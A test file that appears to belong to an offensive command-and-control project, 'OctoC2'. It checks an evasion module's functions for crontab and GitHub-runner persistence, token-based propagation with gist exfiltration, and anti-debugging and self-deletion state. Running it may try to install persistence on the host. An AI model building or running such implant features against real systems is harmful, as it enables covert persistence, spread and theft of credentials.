/**
 * OctoC2 — OpenHulud persistence + propagate tests
 *
 * Tests for installPersistence, propagate, and updated getEvasionState.
 */

import { describe, it, expect } from "bun:test";
import {
  installPersistence,
  propagate,
  getEvasionState,
} from "../evasion/OpenHulud.ts";

describe("installPersistence — crontab", () => {
  it("returns PersistenceResult with method === 'crontab' without throwing", async () => {
    const result = await installPersistence("crontab");
    expect(result).toBeDefined();
    expect(result.method).toBe("crontab");
    // success may be true or false depending on system crontab availability
    expect(typeof result.success).toBe("boolean");
    expect(typeof result.detail).toBe("string");
  });
});

describe("installPersistence — gh-runner", () => {
  it("returns PersistenceResult with method === 'gh-runner' and success=true", async () => {
    const result = await installPersistence("gh-runner");
    expect(result.method).toBe("gh-runner");
    expect(result.success).toBe(true);
    expect(typeof result.detail).toBe("string");
    expect(result.detail.length).toBeGreaterThan(0);
  });
});

describe("installPersistence — auto", () => {
  it("returns a PersistenceResult without throwing", async () => {
    const result = await installPersistence("auto");
    expect(result).toBeDefined();
    expect(typeof result.method).toBe("string");
    expect(typeof result.success).toBe("boolean");
    expect(typeof result.detail).toBe("string");
  });
});

describe("propagate — empty token", () => {
  it("returns tokensFound=0 and exfilRef='dry-run' without throwing", async () => {
    const result = await propagate("", "", "");
    expect(result).toBeDefined();
    expect(result.tokensFound).toBe(0);
    expect(result.exfilRef).toBe("dry-run");
    expect(Array.isArray(result.techniques)).toBe(true);
  });
});

describe("propagate — fake token", () => {
  it("returns PropagateResult structure without throwing even when gist POST fails", async () => {
    const result = await propagate("fake-token-that-will-fail", "owner", "repo");
    expect(result).toBeDefined();
    expect(typeof result.tokensFound).toBe("number");
    expect(result.tokensFound).toBeGreaterThanOrEqual(0);
    // exfilRef should be 'exfil-failed' or a URL — not 'dry-run' since token was provided
    expect(typeof result.exfilRef).toBe("string");
    expect(result.exfilRef).not.toBe("dry-run");
    expect(Array.isArray(result.techniques)).toBe(true);
  });
});

describe("getEvasionState — includes persistence + propagated fields", () => {
  it("state has persistence and propagated fields", () => {
    const state = getEvasionState();
    expect(state).toBeDefined();
    expect(typeof state.hidden).toBe("boolean");
    expect(typeof state.debugDetected).toBe("boolean");
    expect(typeof state.selfDeleted).toBe("boolean");
    // New fields
    expect("persistence" in state).toBe(true);
    expect("propagated" in state).toBe(true);
    expect(typeof state.propagated).toBe("boolean");
    // persistence starts as null
    expect(state.persistence === null || typeof state.persistence === "object").toBe(true);
  });
});
